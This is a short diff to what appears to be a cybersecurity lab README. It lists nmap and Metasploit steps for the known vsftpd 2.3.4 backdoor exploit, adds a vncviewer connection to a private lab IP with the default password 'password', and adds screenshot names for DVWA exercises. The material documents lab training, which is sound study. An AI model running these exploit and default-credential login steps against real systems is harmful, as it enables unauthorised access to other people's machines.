@@ -27,6 +27,7 @@ nmap -sV -sC [target_ip]
 msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS [target_ip]
+vncviewer 192.168.100.152 # Password: password
 run
 ```
 
@@ -51,6 +52,9 @@ cybersecurity-lab/
 └── screenshots/
     ├── nmap-scan.png
     ├── vsftpd-exploit.png
+    ├── vncviewer.png
+    ├── dvwa-access.png
+    ├── dvwa-login.png
     ├── dvwa-sql-injection.png
     └── dvwa-xss.png
 ```
